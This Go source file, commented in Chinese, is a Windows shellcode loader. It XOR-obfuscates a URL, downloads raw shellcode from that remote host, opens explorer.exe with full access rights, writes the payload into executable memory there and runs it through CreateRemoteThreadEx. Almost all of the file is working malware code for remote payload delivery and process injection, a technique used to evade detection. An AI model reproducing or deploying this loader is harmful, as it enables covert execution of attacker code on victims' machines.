package main

import (
	"fmt"
	"log"
	"os"
	"strings"
	"syscall"
	"strconv"
	"unsafe"
  "net/http"
  "io/ioutil"
)

const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF //OpenProcess中的第一个参数，获取最大权限
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	inProcessName            = "explorer.exe"    //需要注入的进程，可修改
	kernel32,_               = syscall.NewLazyDLL("kernel32.dll")
	CreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	Process32Next            = kernel32.NewProc("Process32Next")
	CloseHandle              = kernel32.NewProc("CloseHandle")
	OpenProcess              = kernel32.NewProc("OpenProcess")
	VirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx     = kernel32.NewProc("CreateRemoteThreadEx")
	VirtualProtectEx         = kernel32.NewProc("VirtualProtectEx")
    url                        string
)

var XorKey []byte = []byte{0x12, 0x12, 0x34, 0x67, 0x6A, 0xA1, 0xFF, 0x04, 0x7B, 0x7B}

type Xor struct {
}

func (a *Xor) Enc(src string) string {
    var result string
    j := 0
    s := ""
    bt := []rune(src)
    for i := 0; i < len(bt); i++ {
        s = strconv.FormatInt(int64(byte(bt[i])^XorKey[j]), 16)
        if len(s) == 1 {
            s = "0" + s
        }
        result = result + (s)
        j = (j + 1) % 8
    }
    return result
}

func (a *Xor) Dec(src string) string {
    var result string
    var s int64
    j := 0
    bt := []rune(src)
    //fmt.Println(bt)
    for i := 0; i < len(src)/2; i++ {
        s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
        result = result + string(byte(s)^XorKey[j])
        j = (j + 1) % 8
    }
    return result
}

type ulong int32
type ulong_ptr uintptr
type PROCESSENTRY32 struct {
	dwSize              ulong
	cntUsage            ulong
	th32ProcessID       ulong
	th32DefaultHeapID   ulong_ptr
	th32ModuleID        ulong
	cntThreads          ulong
	th32ParentProcessID ulong
	pcPriClassBase      ulong
	dwFlags             ulong
	szExeFile           [260]byte
}

//根据进程名称获取进程pid
func GetPID() int {
	pHandle, _, _ := CreateToolhelp32Snapshot.Call(uintptr(0x2), uintptr(0x0))
	tasklist := make(map[string]int)
	var PID int
	if int(pHandle) == -1 {
		os.Exit(1)
	}
	//遍历所有进程，并保存至map
	for {
		var proc PROCESSENTRY32
		proc.dwSize = ulong(unsafe.Sizeof(proc))
		if rt, _, _ := Process32Next.Call(pHandle, uintptr(unsafe.Pointer(&proc))); int(rt) == 1 {
			ProcessName := string(proc.szExeFile[0:])
			//th32ModuleID := strconv.Itoa(int(proc.th32ModuleID))
			ProcessID := int(proc.th32ProcessID)
			tasklist[ProcessName] = ProcessID
		} else {
			break
		}
	}
	//从map中取出key为inProcessName的value
	for k, v := range tasklist {
		if strings.Contains(k, inProcessName) == true {
			PID = v
		}
	}
	_, _, _ = CloseHandle.Call(pHandle)

	return PID
}

//根据pid获取句柄
func GetOpenProcess(dwProcessId int) uintptr {
	pHandle, _, _ := OpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), uintptr(0), uintptr(dwProcessId))
	return pHandle
}

//开辟内存空间执行shellcode
func injectProcessAndEx(pHandle uintptr, shellCodeHex []byte) {
	Protect := PAGE_EXECUTE_READWRITE
	addr, _, err := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellCodeHex)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err.Error()))
	}

	WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellCodeHex[0])), uintptr(len(shellCodeHex)))
	VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellCodeHex)), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&Protect)))
	CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
}

func main() {
        xor := Xor{}
    urlencode := xor.Enc(url)
    fmt.Println(urlencode)
    filepath := xor.Dec(urlencode)
    var charcode []byte
    var CL http.Client
    resp, err := CL.Get(filepath)
    if err != nil {
        log.Fatal(err)
    }
    defer resp.Body.Close()
    if resp.StatusCode == http.StatusOK {
        bodyBytes, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            log.Fatal(err)
        }
        charcode = bodyBytes
    }
	dwProcessId := GetPID()
	pHandle := GetOpenProcess(dwProcessId)
	shellCodeHex := charcode
	injectProcessAndEx(pHandle, shellCodeHex)
}
